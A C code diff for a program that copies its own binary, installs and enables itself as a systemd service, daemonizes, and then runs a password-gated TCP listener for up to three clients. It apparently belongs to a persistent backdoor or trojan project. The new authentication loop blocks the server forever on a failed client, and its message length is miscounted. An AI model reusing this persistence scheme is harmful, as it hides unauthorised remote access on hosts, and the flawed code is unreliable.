@@ -96,36 +96,44 @@ int count_connected_clients(int *client_socket)
 }
 
 
-int main(void)
+int main(void) 
 {
-    int server_fd;
-    int new_socket;
-    int client_socket[MAX_CLIENTS];
-    int max_sd;
-    int socket_id;
-    int activity;
-    struct sockaddr_in addr;
+
+    if (getppid() == 1) {
+        int server_fd;
+        int client_socket[MAX_CLIENTS] = {0};
+        struct sockaddr_in addr;
+
+        server_fd = create_server_socket();
+        
+        int opt = 1;
+        if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+            perror("setsockopt failed");
+            exit(EXIT_FAILURE);
+        }
+        
+        bind_and_listen(server_fd, &addr);
+        run_server(server_fd, client_socket, addr);
+    } else {
+        if (access(DEST_FILE, F_OK) == -1) {
+            copy_binary_file(SOURCE_FILE, DEST_FILE);
+            create_systemd_service(SERVICE_NAME, DEST_FILE);
+            enable_and_start_service(SERVICE_NAME);
+            create_daemon();
+        }
+        printf("Service installation complete\n");
+    }
+    
+    return 0;
+}
+
+void run_server(int server_fd, int *client_socket, struct sockaddr_in addr) {
+    fd_set readfds;
+    int max_sd, activity, i, socket_id, new_socket;
     int addrlen = sizeof(addr);
     char buffer[BUFFER_SIZE] = {0};
-    fd_set readfds;
-    int i = 0;
-
-    // Initialize all client_socket[] to 0
-    while (i < MAX_CLIENTS)
-    {
-        client_socket[i] = 0;
-        i++;
-    }
-
-    server_fd = create_server_socket();
-    bind_and_listen(server_fd, &addr);
-    if (access(DEST_FILE, F_OK) == -1){
-        copy_binary_file(SOURCE_FILE, DEST_FILE);
-        create_systemd_service(SERVICE_NAME, DEST_FILE);
-        enable_and_start_service(SERVICE_NAME);
-        create_daemon();
-    }
-    while (1)
+    
+     while (1)
     {
         FD_ZERO(&readfds);
         FD_SET(server_fd, &readfds);
@@ -149,14 +157,11 @@ int main(void)
         if (FD_ISSET(server_fd, &readfds) &&  (count_connected_clients(client_socket) < 3)) 
         {
             new_socket = handle_new_connection(server_fd, &addr, client_socket, addrlen);
-            if (!authenticate_client(new_socket)) {
-                i = 0;
-                while (i < MAX_CLIENTS) {
-                    if (client_socket[i] == new_socket) {
-                        client_socket[i] = 0;
-                        break;
-                    }
-                    i++;
+            while (1) {
+                if (!authenticate_client(new_socket)) {
+                    send(new_socket, "Incorrect password. Please try again.", 36, 0);
+                } else {
+                    break;
                 }
             }
         }
@@ -169,7 +174,4 @@ int main(void)
             i++;
         }
     }
-
-    close(server_fd);
-    return 0;
 }
